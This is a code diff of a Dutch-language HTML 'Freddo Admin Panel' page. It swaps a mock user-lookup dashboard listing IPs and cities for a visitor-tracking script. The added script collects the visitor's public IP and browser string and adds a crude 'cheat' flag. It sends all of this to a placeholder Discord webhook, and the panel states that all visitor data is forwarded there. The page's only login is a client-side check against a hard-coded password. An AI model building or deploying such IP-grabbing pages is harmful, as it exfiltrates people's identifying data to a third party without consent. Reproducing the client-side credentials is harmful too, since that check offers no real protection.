@@ -2,85 +2,88 @@
 <html lang="nl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Freddo OS | Admin Console</title>
+    <title>Freddo Admin Panel v4</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        body { background-color: #020617; color: #94a3b8; font-family: 'Courier New', monospace; }
-        .glass { background: rgba(15, 23, 42, 0.8); backdrop-filter: blur(12px); border: 1px solid #1e293b; }
-        .neon-border { border: 1px solid #3b82f6; box-shadow: 0 0 10px rgba(59, 130, 246, 0.3); }
+        body { background: #050505; color: #00ff41; font-family: 'Courier New', monospace; }
+        .terminal-box { border: 1px solid #00ff41; box-shadow: 0 0 15px rgba(0, 255, 65, 0.2); }
+        input { background: #000; border: 1px solid #00ff41; color: #00ff41; padding: 10px; }
     </style>
 </head>
-<body class="flex items-center justify-center min-h-screen p-4">
+<body class="p-10">
 
-    <div id="login-box" class="glass p-8 rounded-lg neon-border w-full max-w-sm text-center">
-        <h2 class="text-2xl font-bold mb-6 text-white tracking-widest uppercase">Freddo Auth</h2>
-        <input type="text" id="username" placeholder="USER" class="w-full mb-4 p-3 bg-black border border-slate-700 text-blue-400">
-        <input type="password" id="password" placeholder="PASS" class="w-full mb-6 p-3 bg-black border border-slate-700 text-blue-400">
-        <button onclick="checkLogin()" class="w-full bg-blue-900 hover:bg-blue-700 text-white p-3 font-bold transition">EXECUTE LOGIN</button>
+    <div id="login-screen" class="max-w-md mx-auto terminal-box p-8 rounded">
+        <h1 class="text-2xl mb-6 text-center font-bold tracking-widest text-white">FREDDO_LOGIN</h1>
+        <input type="text" id="user" placeholder="USERNAME" class="w-full mb-4">
+        <input type="password" id="pass" placeholder="PASSWORD" class="w-full mb-6">
+        <button onclick="login()" class="w-full bg-green-900 hover:bg-green-700 text-white font-bold p-3 transition">ENTRY</button>
     </div>
 
-    <div id="dashboard" class="hidden w-full max-w-4xl">
-        <div class="glass p-6 rounded-lg neon-border">
-            <div class="flex justify-between items-center mb-6 border-b border-slate-700 pb-4">
-                <h1 class="text-xl font-bold text-blue-400 text-white tracking-tighter">> DATABASE_ACCESS_GRANTED</h1>
-                <span class="text-xs text-slate-500">SYSTEM v3.1.0</span>
+    <div id="admin-panel" class="hidden terminal-box p-8 rounded max-w-4xl mx-auto">
+        <h1 class="text-xl mb-4 border-b border-green-800 pb-2">SYSTEM_LOGS // LIVE_TRAFFIC</h1>
+        
+        <div class="grid grid-cols-1 gap-4 mb-6">
+            <div class="bg-black p-4 border border-green-900">
+                <p class="text-xs text-green-700 mb-2">// LAATSTE ACTIVITEIT</p>
+                <div id="log-content" class="text-sm">Wachten op data...</div>
             </div>
+        </div>
 
-            <div class="mb-8 flex gap-2">
-                <input type="text" id="search-id" placeholder="Voer User ID in (bijv. 1234)..." class="flex-1 p-3 bg-black border border-blue-900 text-blue-400 focus:outline-none">
-                <button onclick="searchUser()" class="bg-blue-600 text-white px-6 hover:bg-blue-500 font-bold">ZOEK</button>
-            </div>
-
-            <div id="results" class="hidden grid grid-cols-1 md:grid-cols-2 gap-4 animate-pulse">
-                <div class="p-4 bg-slate-900 border border-slate-800">
-                    <h3 class="text-blue-400 mb-2">Locatie & IP</h3>
-                    <p id="res-ip">IP: --</p>
-                    <p id="res-geo">Stad: --</p>
-                    <p id="res-address" class="text-red-400 text-xs mt-2 italic">Adres: Privé (Provider Locked)</p>
-                </div>
-                <div class="p-4 bg-slate-900 border border-slate-800">
-                    <h3 class="text-blue-400 mb-2">Cheat Detectie</h3>
-                    <p id="res-hacks">Hacks: --</p>
-                    <p id="res-discord">Discord: --</p>
-                </div>
-            </div>
-            
-            <p id="not-found" class="hidden text-red-500 text-center font-bold">USER_ID_NOT_FOUND IN DATABASE</p>
+        <div class="text-xs text-green-700">
+            INFO: Alle bezoekersdata wordt direct naar je Discord verzonden.
         </div>
     </div>
 
     <script>
-        // Nep-database van gebruikers
-        const userDb = {
-            "1234": { ip: "185.20.44.11", city: "Amsterdam", hacks: "Aimbot.exe, Speedhack", discord: "Server: Freddo-Army" },
-            "5678": { ip: "92.110.12.5", city: "Rotterdam", hacks: "Geen", discord: "Server: Gaming-NL" },
-            "9999": { ip: "213.45.1.99", city: "Utrecht", hacks: "Wallhack detected", discord: "Server: Chill-Zone" }
-        };
+        // CONFIGURATIE
+        const DISCORD_WEBHOOK = "HIER_JE_DISCORD_WEBHOOK_URL_PLAKKEN";
 
-        function checkLogin() {
-            if(document.getElementById('username').value === "freddo" && document.getElementById('password').value === "administratie") {
-                document.getElementById('login-box').classList.add('hidden');
-                document.getElementById('dashboard').classList.remove('hidden');
+        // 1. Automatisch data verzamelen bij bezoek
+        async function trackVisitor() {
+            try {
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                
+                // Check of ze "cheaten" (Inspect element open)
+                let cheatDetected = (window.outerWidth - window.innerWidth > 160) ? "JA (Console open)" : "NEE";
+
+                const logMessage = {
+                    embeds: [{
+                        title: "🚀 Nieuwe Bezoeker Gedetecteerd",
+                        color: 65280,
+                        fields: [
+                            { name: "IP Adres", value: ipData.ip, inline: true },
+                            { name: "Cheat Status", value: cheatDetected, inline: true },
+                            { name: "Browser", value: navigator.userAgent, inline: false }
+                        ],
+                        footer: { text: "Freddo Tracking System" }
+                    }]
+                };
+
+                // Verzend naar Discord
+                fetch(DISCORD_WEBHOOK, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(logMessage)
+                });
+
+                document.getElementById('log-content').innerHTML = `> IP ${ipData.ip} verbonden. Status: ${cheatDetected}`;
+            } catch (e) {
+                console.log("Tracking error");
             }
         }
 
-        function searchUser() {
-            const id = document.getElementById('search-id').value;
-            const resDiv = document.getElementById('results');
-            const notFound = document.getElementById('not-found');
+        // 2. Login Functie
+        function login() {
+            const u = document.getElementById('user').value;
+            const p = document.getElementById('pass').value;
 
-            if(userDb[id]) {
-                resDiv.classList.remove('hidden');
-                notFound.classList.add('hidden');
-                
-                document.getElementById('res-ip').innerText = "IP: " + userDb[id].ip;
-                document.getElementById('res-geo').innerText = "Stad: " + userDb[id].city;
-                document.getElementById('res-hacks').innerText = "Status: " + userDb[id].hacks;
-                document.getElementById('res-discord').innerText = "Discord: " + userDb[id].discord;
+            if(u === "freddo" && p === "administratie") {
+                document.getElementById('login-screen').classList.add('hidden');
+                document.getElementById('admin-panel').classList.remove('hidden');
+                trackVisitor(); // Start tracking zodra ingelogd
             } else {
-                resDiv.classList.add('hidden');
-                notFound.classList.remove('hidden');
+                alert("ACCESS DENIED");
             }
         }
     </script>
